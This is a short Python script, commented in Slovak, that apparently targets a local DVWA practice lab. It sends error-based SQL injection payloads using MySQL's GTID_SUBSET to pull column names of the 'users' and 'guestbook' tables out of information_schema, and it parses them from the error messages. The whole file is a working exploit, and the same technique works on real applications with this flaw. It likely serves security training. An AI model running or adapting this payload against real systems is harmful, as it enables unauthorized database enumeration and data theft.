import requests

# URL pre SQLi
test_url = "http://localhost:8080/vulnerabilities/sqli/"
headers = {"User-Agent": "Mozilla/5.0"}

# Nastavenie cookies získaných po prihlásení
cookies = {
    "PHPSESSID": "ec49e225f71cdba14d2d79e6d035d1cb",  # Nahraď hodnotou z prehliadača
    "security": "low"
}

table_name = ["users", "guestbook"]  # Alebo iná tabuľka
columns = [[], []]
offset = 0

for i in range(2):
    found = True
    offset = 0
    while found:
        payload = f"1' AND GTID_SUBSET(CONCAT(0x7162707071,(SELECT column_name FROM information_schema.columns WHERE table_name='{table_name[i]}' LIMIT 1 OFFSET {offset}),0x717a716b71),6179)-- -"
        data = {"id": payload, "Submit": "Submit"}

        # Odoslanie požiadavky s cookies
        response = requests.post(test_url, data=data, headers=headers, cookies=cookies)

        # print(f"Testing OFFSET {offset}:")
        # print(response.text)  # Debug: Zobrazenie odpovede servera

        if "Malformed GTID set specification" in response.text:
            start = response.text.find("qbppq") + 5
            end = response.text.find("qzqkq")
            column_name = response.text[start:end]
            columns[i].append(column_name)
            # print(f"Column {offset + 1}: {column_name}")
            offset += 1
        else:
            found = False

print("All columns:", columns)